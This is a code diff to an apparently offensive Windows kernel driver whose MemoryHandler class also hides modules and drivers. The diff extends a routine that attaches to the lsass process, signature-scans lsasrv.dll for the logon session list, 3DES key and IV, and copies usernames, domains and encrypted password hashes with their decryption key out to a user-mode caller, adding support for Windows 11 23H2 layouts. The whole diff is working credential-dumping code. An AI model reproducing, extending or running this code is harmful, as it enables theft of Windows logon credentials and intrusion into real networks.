@@ -8,6 +8,7 @@ MemoryHandler::MemoryHandler() {
 	lsassMetadata.LogonSessionList = NULL;
 	lsassMetadata.Lock.Init();
 	cachedLsassInfo.Count = 0;
+	cachedLsassInfo.AllocationSize = nullptr;
 	cachedLsassInfo.Creds = NULL;
 	cachedLsassInfo.DesKey.Data = NULL;
 	cachedLsassInfo.Lock.Init();
@@ -33,7 +34,9 @@ MemoryHandler::~MemoryHandler() {
 	FreeVirtualMemory(this->hiddenModules.Items);
 
 	AutoLock lsassLock(cachedLsassInfo.Lock);
+	FreeVirtualMemory(cachedLsassInfo.AllocationSize);
 	FreeVirtualMemory(cachedLsassInfo.DesKey.Data);
+	FreeVirtualMemory(cachedLsassInfo.Iv.Data);
 
 	if (cachedLsassInfo.Creds) {
 		if (cachedLsassInfo.Count != 0) {
@@ -884,13 +887,13 @@ NTSTATUS MemoryHandler::UnhideDriver(_In_ wchar_t* driverPath) {
 * DumpCredentials is responsible for dumping credentials from lsass.
 *
 * Parameters:
-* allocationSize [_Out_ SIZE_T*] -- Size to allocate for credentials buffer.
+* allocationSize [_Out_ PSIZE_T] -- Size to allocate for credentials buffer.
 *
 * Returns:
 * @status		 [NTSTATUS]		 -- Whether successfuly dumped or not.
 */
 _IRQL_requires_max_(APC_LEVEL)
-NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
+NTSTATUS MemoryHandler::DumpCredentials(_Out_ IoctlCredentialsInfoSize* allocationSize) {
 	NTSTATUS status = STATUS_SUCCESS;
 	KAPC_STATE state;
 	SIZE_T bytesWritten = 0;
@@ -898,26 +901,92 @@ NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
 	ULONG credentialsIndex = 0;
 	ULONG validCredentialsCount = 0;
 	ULONG credentialsCount = 0;
-	PLSASRV_CREDENTIALS currentCredentials = nullptr;
+	ULONG lsassPid = 0;
+	UNICODE_STRING currentUsername = { 0 };
+	PMSV1_0_CREDENTIALS currentUserCreds = { 0 };
+	UNICODE_STRING currentUserDomain = { 0 };
+	PLIST_ENTRY currentCredentials = nullptr;
+	PEPROCESS currentProcess = PsGetCurrentProcess();
+
+	auto GetUser = [](PLIST_ENTRY currentCredentials) -> UNICODE_STRING {
+		UNICODE_STRING username = { 0 };
+
+		if (WindowsBuildNumber >= WIN_11_23H2) {
+			PLSASRV_CREDENTIALS_WIN23H2 creds = CONTAINING_RECORD(currentCredentials, LSASRV_CREDENTIALS_WIN23H2, Entry);
+			username = creds->UserName;
+		}
+		else {
+			PLSASRV_CREDENTIALS creds = CONTAINING_RECORD(currentCredentials, LSASRV_CREDENTIALS, Entry);
+			username = creds->UserName;
+		}
+		return username;
+	};
+
+	auto GetDomain = [](PLIST_ENTRY currentCredentials) -> UNICODE_STRING {
+		UNICODE_STRING domain = { 0 };
+		if (WindowsBuildNumber >= WIN_11_23H2) {
+			PLSASRV_CREDENTIALS_WIN23H2 creds = CONTAINING_RECORD(currentCredentials, LSASRV_CREDENTIALS_WIN23H2, Entry);
+			domain = creds->Domain;
+		}
+		else {
+			PLSASRV_CREDENTIALS creds = CONTAINING_RECORD(currentCredentials, LSASRV_CREDENTIALS, Entry);
+			domain = creds->Domain;
+		}
+		return domain;
+	};
+
+	auto GetCreds = [](PLIST_ENTRY currentCredentials) -> PMSV1_0_CREDENTIALS {
+		PMSV1_0_CREDENTIALS creds = nullptr;
+
+		if (WindowsBuildNumber >= WIN_11_23H2) {
+			PLSASRV_CREDENTIALS_WIN23H2 credsStruct = CONTAINING_RECORD(currentCredentials, LSASRV_CREDENTIALS_WIN23H2, Entry);
+			creds = credsStruct->Credentials;
+		}
+		else {
+			PLSASRV_CREDENTIALS credsStruct = CONTAINING_RECORD(currentCredentials, LSASRV_CREDENTIALS, Entry);
+			creds = credsStruct->Credentials;
+		}
+		return creds;
+	};
 
 	if (!allocationSize)
 		return STATUS_INVALID_PARAMETER;
 
-	if (cachedLsassInfo.Count != 0)
-		return STATUS_ABANDONED;
+	// If we have cached information, we can return the sizes right away.
+	if (cachedLsassInfo.Count != 0) {
+		allocationSize->CredentialsCount = cachedLsassInfo.Count;
+		allocationSize->DesKeySize = cachedLsassInfo.DesKey.Size;
+		allocationSize->IvSize = cachedLsassInfo.Iv.Size;
+		return STATUS_SUCCESS;
+	}
+
+	__try {
+		lsassPid = FindPidByName(L"lsass.exe");
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		return GetExceptionCode();
+	}
 
 	if (!lsassMetadata.Collected) {
-		status = GetLsassMetadata(lsass);
+		status = GetLsassMetadata(lsassPid);
 		lsassMetadata.Collected = NT_SUCCESS(status);
 
 		if (!lsassMetadata.Collected)
 			return status;
 	}
+	allocationSize->CredentialsCount = 0;
+
+	status = PsLookupProcessByProcessId(ULongToHandle(lsassPid), &lsass);
+
+	if (!NT_SUCCESS(status))
+		return status;
 	AutoLock locker(lsassMetadata.Lock);
 
 	KeStackAttachProcess(lsass, &state);
 	do {
 		AutoLock cacheLock(cachedLsassInfo.Lock);
+
+		// Copying DES key.
 		cachedLsassInfo.DesKey.Size = lsassMetadata.DesKey->hKey->key->hardkey.cbSecret;
 		cachedLsassInfo.DesKey.Data = AllocateMemory<PVOID>(cachedLsassInfo.DesKey.Size);
 
@@ -925,16 +994,30 @@ NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
 			status = STATUS_INSUFFICIENT_RESOURCES;
 			break;
 		}
-		status = MmCopyVirtualMemory(lsass, lsassMetadata.DesKey->hKey->key->hardkey.data, IoGetCurrentProcess(),
+		status = MmCopyVirtualMemory(lsass, lsassMetadata.DesKey->hKey->key->hardkey.data, currentProcess,
 			cachedLsassInfo.DesKey.Data, cachedLsassInfo.DesKey.Size, KernelMode, &bytesWritten);
 
 		if (!NT_SUCCESS(status))
 			break;
 
-		currentCredentials = reinterpret_cast<PLSASRV_CREDENTIALS>(lsassMetadata.LogonSessionList->Flink);
+		// Copying IV.
+		cachedLsassInfo.Iv.Size = IV_DEFAULT_SIZE;
+		cachedLsassInfo.Iv.Data = AllocateMemory<PVOID>(cachedLsassInfo.Iv.Size);
+
+		if (!cachedLsassInfo.Iv.Data) {
+			status = STATUS_INSUFFICIENT_RESOURCES;
+			break;
+		}
+		status = MmCopyVirtualMemory(lsass, lsassMetadata.IvAddress, currentProcess, cachedLsassInfo.Iv.Data,
+			cachedLsassInfo.Iv.Size, KernelMode, &bytesWritten);
+
+		if (!NT_SUCCESS(status))
+			break;
+
+		currentCredentials = lsassMetadata.LogonSessionList->Flink;
 
 		// Getting the real amount of credentials.
-		while (currentCredentials != reinterpret_cast<PLSASRV_CREDENTIALS>(lsassMetadata.LogonSessionList)) {
+		while (currentCredentials != lsassMetadata.LogonSessionList) {
 			credentialsCount++;
 			currentCredentials = currentCredentials->Flink;
 		}
@@ -949,77 +1032,157 @@ NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
 			status = STATUS_INSUFFICIENT_RESOURCES;
 			break;
 		}
-		currentCredentials = reinterpret_cast<PLSASRV_CREDENTIALS>(lsassMetadata.LogonSessionList->Flink);
+		cachedLsassInfo.AllocationSize = AllocateMemory<IoctlCredentialsSize*>(credentialsCount * 
+			sizeof(IoctlCredentialsSize));
+
+		if (!cachedLsassInfo.AllocationSize) {
+			status = STATUS_INSUFFICIENT_RESOURCES;
+			break;
+		}
+		currentCredentials = lsassMetadata.LogonSessionList->Flink;
 
 		// Getting the interesting information.
 		for (credentialsIndex = 0; credentialsIndex < credentialsCount && 
-			currentCredentials != reinterpret_cast<PLSASRV_CREDENTIALS>(lsassMetadata.LogonSessionList);
+			currentCredentials != lsassMetadata.LogonSessionList;
 			credentialsIndex++, currentCredentials = currentCredentials->Flink) {
+			currentUsername = GetUser(currentCredentials);
+			currentUserCreds = GetCreds(currentCredentials);
+			currentUserDomain = GetDomain(currentCredentials);
 
-			if (currentCredentials->UserName.Length == 0 || !currentCredentials->Credentials)
+			if (currentUsername.Length == 0 || currentUserDomain.Length == 0 || !currentUserCreds)
 				continue;
 
-			if (!currentCredentials->Credentials->PrimaryCredentials)
+			if (!currentUserCreds->PrimaryCredentials)
 				continue;
 
-			if (currentCredentials->Credentials->PrimaryCredentials->Credentials.Length == 0)
+			if (currentUserCreds->PrimaryCredentials->Credentials.Length == 0)
 				continue;
 
-			cachedLsassInfo.Creds[credentialsIndex].Username.Buffer = NULL;
-			status = CopyUnicodeString(lsass, &currentCredentials->UserName, IoGetCurrentProcess(),
-				&cachedLsassInfo.Creds[credentialsIndex].Username, KernelMode);
-			
-			if (!NT_SUCCESS(status))
+			cachedLsassInfo.Creds[validCredentialsCount].Username.Buffer = AllocateMemory<WCHAR*>(currentUsername.MaximumLength);
+
+			if (!cachedLsassInfo.Creds[validCredentialsCount].Username.Buffer) {
+				status = STATUS_INSUFFICIENT_RESOURCES;
 				break;
+			}
+			status = CopyUnicodeString(lsass, 
+				&currentUsername, 
+				currentProcess,
+				&cachedLsassInfo.Creds[validCredentialsCount].Username, 
+				KernelMode);
+			
+			if (!NT_SUCCESS(status)) {
+				FreeVirtualMemory(cachedLsassInfo.Creds[validCredentialsCount].Username.Buffer);
+				break;
+			}
+			cachedLsassInfo.Creds[validCredentialsCount].Domain.Buffer = AllocateMemory<WCHAR*>(currentUserDomain.MaximumLength);
 
-			cachedLsassInfo.Creds[credentialsIndex].Domain.Buffer = NULL;
-			status = CopyUnicodeString(lsass, &currentCredentials->Domain, IoGetCurrentProcess(),
-				&cachedLsassInfo.Creds[credentialsIndex].Domain, KernelMode);
+			if (!cachedLsassInfo.Creds[validCredentialsCount].Domain.Buffer) {
+				FreeVirtualMemory(cachedLsassInfo.Creds[validCredentialsCount].Username.Buffer);
+				status = STATUS_INSUFFICIENT_RESOURCES;
+				break;
+			}
+			status = CopyUnicodeString(lsass, 
+				&currentUserDomain, 
+				currentProcess,
+				&cachedLsassInfo.Creds[validCredentialsCount].Domain, 
+				KernelMode);
 
 			if (!NT_SUCCESS(status)) {
-				FreeVirtualMemory(cachedLsassInfo.Creds[credentialsIndex].Username.Buffer);
+				FreeVirtualMemory(cachedLsassInfo.Creds[validCredentialsCount].Domain.Buffer);
+				FreeVirtualMemory(cachedLsassInfo.Creds[validCredentialsCount].Username.Buffer);
 				break;
 			}
 
-			cachedLsassInfo.Creds[credentialsIndex].EncryptedHash.Buffer = NULL;
-			status = CopyUnicodeString(lsass, &currentCredentials->Credentials->PrimaryCredentials->Credentials,
-				IoGetCurrentProcess(), &cachedLsassInfo.Creds[credentialsIndex].EncryptedHash, KernelMode);
-			
-			if (!NT_SUCCESS(status)) {
-				FreeVirtualMemory(cachedLsassInfo.Creds[credentialsIndex].Domain.Buffer);
-				FreeVirtualMemory(cachedLsassInfo.Creds[credentialsIndex].Username.Buffer);
+			cachedLsassInfo.Creds[validCredentialsCount].EncryptedHash.Buffer = AllocateMemory<WCHAR*>(
+				currentUserCreds->PrimaryCredentials->Credentials.Length);
+
+			if (!cachedLsassInfo.Creds[validCredentialsCount].EncryptedHash.Buffer) {
+				FreeVirtualMemory(cachedLsassInfo.Creds[validCredentialsCount].Domain.Buffer);
+				FreeVirtualMemory(cachedLsassInfo.Creds[validCredentialsCount].Username.Buffer);
+				status = STATUS_INSUFFICIENT_RESOURCES;
 				break;
 			}
+			status = CopyUnicodeString(lsass, &currentUserCreds->PrimaryCredentials->Credentials,
+				currentProcess, &cachedLsassInfo.Creds[validCredentialsCount].EncryptedHash, KernelMode);
+			
+			if (!NT_SUCCESS(status)) {
+				FreeVirtualMemory(cachedLsassInfo.Creds[validCredentialsCount].EncryptedHash.Buffer);
+				FreeVirtualMemory(cachedLsassInfo.Creds[validCredentialsCount].Domain.Buffer);
+				FreeVirtualMemory(cachedLsassInfo.Creds[validCredentialsCount].Username.Buffer);
+				break;
+			}
+			cachedLsassInfo.AllocationSize[validCredentialsCount].DomainAllocSize = currentUserDomain.MaximumLength;
+			cachedLsassInfo.AllocationSize[validCredentialsCount].UsernameAllocSize = currentUsername.MaximumLength;
+			cachedLsassInfo.AllocationSize[validCredentialsCount].EncryptedHashAllocSize =
+				cachedLsassInfo.Creds[validCredentialsCount].EncryptedHash.MaximumLength;
 			validCredentialsCount++;
 		}
 
 	} while (false);
 	KeUnstackDetachProcess(&state);
 
+	if (lsass)
+		ObDereferenceObject(lsass);
+
 	if (!NT_SUCCESS(status)) {
-		if (credentialsIndex > 0) {
-			for (ULONG i = 0; i < credentialsIndex; i++) {
-				FreeVirtualMemory(cachedLsassInfo.Creds[credentialsIndex].EncryptedHash.Buffer);
-				FreeVirtualMemory(cachedLsassInfo.Creds[credentialsIndex].Domain.Buffer);
-				FreeVirtualMemory(cachedLsassInfo.Creds[credentialsIndex].Username.Buffer);
+		if (validCredentialsCount > 0) {
+			for (ULONG i = 0; i < validCredentialsCount; i++) {
+				FreeVirtualMemory(cachedLsassInfo.Creds[i].EncryptedHash.Buffer);
+				FreeVirtualMemory(cachedLsassInfo.Creds[i].Domain.Buffer);
+				FreeVirtualMemory(cachedLsassInfo.Creds[i].Username.Buffer);
 			}
 		}
 
 		if (cachedLsassInfo.Creds)
 			FreeVirtualMemory(cachedLsassInfo.Creds);
 
+		if (cachedLsassInfo.AllocationSize)
+			FreeVirtualMemory(cachedLsassInfo.AllocationSize);
+
 		if (cachedLsassInfo.DesKey.Data)
 			FreeVirtualMemory(cachedLsassInfo.DesKey.Data);
-	}
-	else {
-		cachedLsassInfo.Count = validCredentialsCount;
-		*allocationSize = validCredentialsCount;
+
+		if (cachedLsassInfo.Iv.Data)
+			FreeVirtualMemory(cachedLsassInfo.Iv.Data);
+
+		return status;
 	}
 
-	if (lsass)
-		ObDereferenceObject(lsass);
-
+	cachedLsassInfo.Count = validCredentialsCount;
+	allocationSize->CredentialsCount = validCredentialsCount;
+	allocationSize->DesKeySize = cachedLsassInfo.DesKey.Size;
+	allocationSize->IvSize = cachedLsassInfo.Iv.Size;
 	return status;
+}
+
+/*
+* Description:
+* GetCredentialsSize is responsible for getting the required sizes for dumping credentials from lsass.
+* 
+* Parameters:
+* @credentialsSize [_Inout_ IoctlCredentialsSize*] -- Required information, contains the sizes to allocate for credentials buffer.
+* 
+* Returns:
+* @status		   [NTSTATUS]					   -- Whether successfuly got the sizes or not.
+*/
+_IRQL_requires_max_(APC_LEVEL)
+NTSTATUS MemoryHandler::GetCredentialsSize(_Inout_ IoctlCredentialsSize* credentialsSize) {
+	if (!credentialsSize)
+		return STATUS_INVALID_PARAMETER;
+
+	MemoryGuard credentialGuard(credentialsSize,
+		static_cast<ULONG>(sizeof(IoctlCredentialsSize) * cachedLsassInfo.Count),
+		UserMode);
+
+	if (!credentialGuard.IsValid())
+		return STATUS_INVALID_PARAMETER;
+
+	for (ULONG i = 0; i < cachedLsassInfo.Count; i++) {
+		credentialsSize[i].DomainAllocSize = cachedLsassInfo.AllocationSize[i].DomainAllocSize;
+		credentialsSize[i].UsernameAllocSize = cachedLsassInfo.AllocationSize[i].UsernameAllocSize;
+		credentialsSize[i].EncryptedHashAllocSize = cachedLsassInfo.AllocationSize[i].EncryptedHashAllocSize;
+	}
+	return STATUS_SUCCESS;
 }
 
 /*
@@ -1027,23 +1190,23 @@ NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
 * GetLsassMetadata is responsible for collecting all the required information from lsass in order to decrypt credentials.
 * 
 * Parameters:
-* @lsass  [_Inout_ PEPROCESS&] -- The EPROCESS of lsass.
+* @lsassPid [ULONG]  -- Required information, contains lsass's PID.
 * 
 * Returns:
-* @status [NTSTATUS]		   -- Whether successfuly collected or not.
+* @status [NTSTATUS] -- Whether successfuly collected or not.
 */
 _IRQL_requires_max_(APC_LEVEL)
-NTSTATUS MemoryHandler::GetLsassMetadata(_Inout_ PEPROCESS& lsass) {
+NTSTATUS MemoryHandler::GetLsassMetadata(_In_ ULONG lsassPid) {
 	KAPC_STATE state;
-	ULONG lsassPid = 0;
 	ULONG foundIndex = 0;
 	PVOID lsasrvMain = nullptr;
 	PVOID lsaIGetNbAndDnsDomainNames = nullptr;
 	WCHAR* mainDriveLetter = nullptr;
+	PEPROCESS lsass = nullptr;
 	const WCHAR lsasrvDll[] = L"\\Windows\\System32\\lsasrv.dll";
 	MemoryAllocator<WCHAR*> fullPath((DRIVE_LETTER_SIZE + wcslen(lsasrvDll)) * sizeof(WCHAR));
 
-	if (!fullPath.IsValid())
+	if (!fullPath.IsValid() || lsassPid <= SYSTEM_PROCESS_PID)
 		return STATUS_INSUFFICIENT_RESOURCES;
 
 	auto AlignAddress = [](ULONGLONG Address) -> ULONGLONG {
@@ -1055,13 +1218,6 @@ NTSTATUS MemoryHandler::GetLsassMetadata(_Inout_ PEPROCESS& lsass) {
 
 	if (lsassMetadata.Collected)
 		return STATUS_SUCCESS;
-
-	__try {
-		lsassPid = FindPidByName(L"lsass.exe");
-	}
-	__except (EXCEPTION_EXECUTE_HANDLER) {
-		return GetExceptionCode();
-	}
 
 	NTSTATUS status = PsLookupProcessByProcessId(ULongToHandle(lsassPid), &lsass);
 
@@ -1107,7 +1263,7 @@ NTSTATUS MemoryHandler::GetLsassMetadata(_Inout_ PEPROCESS& lsass) {
 			break;
 		}
 		lsassMetadata.IvAddress = static_cast<PVOID>(static_cast<PUCHAR>(lsaInitializeProtectedMemory) +
-			(*ivAddressOffset) + foundIndex);
+			(*ivAddressOffset) + foundIndex + IvSignaturePattern.GetOffsetForVersion(WindowsBuildNumber));
 
 		// Getting 3DES key
 		PLONG desKeyAddressOffset = static_cast<PLONG>(FindPattern(DesKeySignaturePattern, lsaInitializeProtectedMemory, 
@@ -1119,7 +1275,7 @@ NTSTATUS MemoryHandler::GetLsassMetadata(_Inout_ PEPROCESS& lsass) {
 		}
 		PBCRYPT_GEN_KEY desKey = reinterpret_cast<PBCRYPT_GEN_KEY>(static_cast<PUCHAR>(lsaInitializeProtectedMemory) +
 			(*desKeyAddressOffset) + foundIndex + DesKeyStructOffset);
-		status = ProbeAddress(desKey, sizeof(BCRYPT_GEN_KEY), sizeof(BCRYPT_GEN_KEY));
+		status = ProbeAddress(desKey, sizeof(BCRYPT_GEN_KEY), __alignof(BCRYPT_GEN_KEY));
 
 		if (!NT_SUCCESS(status))
 			break;
@@ -1154,7 +1310,7 @@ NTSTATUS MemoryHandler::GetLsassMetadata(_Inout_ PEPROCESS& lsass) {
 
 		logonSessionListAddress = reinterpret_cast<PLIST_ENTRY>(AlignAddress(reinterpret_cast<ULONGLONG>(logonSessionListAddress)));
 
-		status = ProbeAddress(logonSessionListAddress, sizeof(PLSASRV_CREDENTIALS), sizeof(PLSASRV_CREDENTIALS));
+		status = ProbeAddress(logonSessionListAddress, sizeof(PLSASRV_CREDENTIALS), __alignof(PLSASRV_CREDENTIALS));
 
 		if (!NT_SUCCESS(status))
 			break;
@@ -1163,8 +1319,10 @@ NTSTATUS MemoryHandler::GetLsassMetadata(_Inout_ PEPROCESS& lsass) {
 	} while (false);
 	KeUnstackDetachProcess(&state);
 
-	if (!NT_SUCCESS(status))
+	if (!NT_SUCCESS(status)) {
 		FreeVirtualMemory(lsassMetadata.DesKey);
+		ObDereferenceObject(lsass);
+	}
 	return status;
 }
 
@@ -1183,71 +1341,92 @@ NTSTATUS MemoryHandler::GetCredentials(_Inout_ IoctlCredentialsInformation* cred
 	SIZE_T bytesWritten = 0;
 	SIZE_T i = 0;
 	NTSTATUS status = STATUS_SUCCESS;
+	PEPROCESS currentProcess = PsGetCurrentProcess();
 
-	if (!credentials)
+	if (!credentials ||
+		credentials->Count != cachedLsassInfo.Count ||
+		credentials->DesKey.Size != cachedLsassInfo.DesKey.Size ||
+		credentials->Iv.Size != cachedLsassInfo.Iv.Size)
 		return STATUS_INVALID_PARAMETER;
 	AutoLock lock(cachedLsassInfo.Lock);
 
-	if (credentials->Count != cachedLsassInfo.Count) {
-		credentials->Count = cachedLsassInfo.Count;
-		credentials->DesKey.Size = cachedLsassInfo.DesKey.Size;
-		credentials->Iv.Size = cachedLsassInfo.Iv.Size;
-		return STATUS_SUCCESS;
-	}
-	if (credentials->DesKey.Size != cachedLsassInfo.DesKey.Size) {
-		credentials->DesKey.Size = cachedLsassInfo.DesKey.Size;
-		return STATUS_SUCCESS;
-	}
-	if (credentials->Iv.Size != cachedLsassInfo.Iv.Size) {
-		credentials->Iv.Size = cachedLsassInfo.Iv.Size;
-		return STATUS_SUCCESS;
-	}
-
 	MemoryGuard desKeyGuard(credentials->DesKey.Data, cachedLsassInfo.DesKey.Size, UserMode);
 	MemoryGuard ivGuard(credentials->Iv.Data, cachedLsassInfo.Iv.Size, UserMode);
-	MemoryGuard credentialGuard(credentials->Creds, static_cast<ULONG>(sizeof(IoctlCredentials) * cachedLsassInfo.Count), UserMode);
+	MemoryGuard credentialGuard(credentials->Creds, 
+		static_cast<ULONG>(sizeof(IoctlCredentials) * cachedLsassInfo.Count), 
+		UserMode);
 
 	if (!desKeyGuard.IsValid() || !credentialGuard.IsValid() || !ivGuard.IsValid())
 		return STATUS_INVALID_ADDRESS;
-	status = MmCopyVirtualMemory(IoGetCurrentProcess(), cachedLsassInfo.DesKey.Data,
-		IoGetCurrentProcess(), credentials->DesKey.Data, cachedLsassInfo.DesKey.Size, KernelMode, &bytesWritten);
+
+	status = MmCopyVirtualMemory(currentProcess, 
+		cachedLsassInfo.DesKey.Data,
+		currentProcess, 
+		credentials->DesKey.Data, 
+		cachedLsassInfo.DesKey.Size, 
+		KernelMode, 
+		&bytesWritten);
 
 	if (!NT_SUCCESS(status))
 		return status;
 
-	status = MmCopyVirtualMemory(IoGetCurrentProcess(), cachedLsassInfo.Iv.Data,
-		IoGetCurrentProcess(), credentials->Iv.Data, cachedLsassInfo.Iv.Size, KernelMode, &bytesWritten);
+	status = MmCopyVirtualMemory(currentProcess, 
+		cachedLsassInfo.Iv.Data,
+		currentProcess, 
+		credentials->Iv.Data, 
+		cachedLsassInfo.Iv.Size, 
+		KernelMode, 
+		&bytesWritten);
 
 	if (!NT_SUCCESS(status))
 		return status;
 
 	for (i = 0; i < credentials->Count; i++) {
-		status = CopyUnicodeString(IoGetCurrentProcess(), &credentials->Creds[i].Username, IoGetCurrentProcess(),
-			&credentials->Creds[i].Username, UserMode);
+		credentials->Creds[i].Username.Length = cachedLsassInfo.Creds[i].Username.Length;
+		credentials->Creds[i].Username.MaximumLength = cachedLsassInfo.Creds[i].Username.MaximumLength;
+
+		status = MmCopyVirtualMemory(currentProcess, 
+			cachedLsassInfo.Creds[i].Username.Buffer,
+			currentProcess, 
+			credentials->Creds[i].Username.Buffer, 
+			cachedLsassInfo.Creds[i].Username.MaximumLength,
+			KernelMode, 
+			&bytesWritten);
 
 		if (!NT_SUCCESS(status))
 			break;
-		status = CopyUnicodeString(IoGetCurrentProcess(), &credentials->Creds[i].Domain, IoGetCurrentProcess(),
-			&credentials->Creds[i].Domain, UserMode);
+		credentials->Creds[i].Domain.Length = cachedLsassInfo.Creds[i].Domain.Length;
+		credentials->Creds[i].Domain.MaximumLength = cachedLsassInfo.Creds[i].Domain.MaximumLength;
+
+		status = MmCopyVirtualMemory(currentProcess, 
+			cachedLsassInfo.Creds[i].Domain.Buffer,
+			currentProcess, 
+			credentials->Creds[i].Domain.Buffer, 
+			cachedLsassInfo.Creds[i].Domain.MaximumLength,
+			KernelMode, 
+			&bytesWritten);
 
 		if (!NT_SUCCESS(status))
 			break;
-		status = CopyUnicodeString(IoGetCurrentProcess(), &credentials->Creds[i].EncryptedHash, IoGetCurrentProcess(),
-			&credentials->Creds[i].EncryptedHash, UserMode);
+		credentials->Creds[i].EncryptedHash.Length = cachedLsassInfo.Creds[i].EncryptedHash.Length;
+		credentials->Creds[i].EncryptedHash.MaximumLength = cachedLsassInfo.Creds[i].EncryptedHash.MaximumLength;
+
+		status = MmCopyVirtualMemory(currentProcess, 
+			cachedLsassInfo.Creds[i].EncryptedHash.Buffer,
+			currentProcess, 
+			credentials->Creds[i].EncryptedHash.Buffer, 
+			cachedLsassInfo.Creds[i].EncryptedHash.MaximumLength,
+			KernelMode, 
+			&bytesWritten);
 
 		if (!NT_SUCCESS(status))
 			break;
 	}
-	if (!NT_SUCCESS(status)) {
-		for (size_t j = 0; j <= i; j++) {
-			FreeVirtualMemory(credentials->Creds[j].Username.Buffer);
-			FreeVirtualMemory(credentials->Creds[j].Domain.Buffer);
-			FreeVirtualMemory(credentials->Creds[j].EncryptedHash.Buffer);
-		}
+	if (!NT_SUCCESS(status))
 		return status;
-	}
 
 	cachedLsassInfo.Count = 0;
+	FreeVirtualMemory(cachedLsassInfo.AllocationSize);
 	FreeVirtualMemory(cachedLsassInfo.Creds);
 	FreeVirtualMemory(cachedLsassInfo.DesKey.Data);
 	FreeVirtualMemory(cachedLsassInfo.Iv.Data);
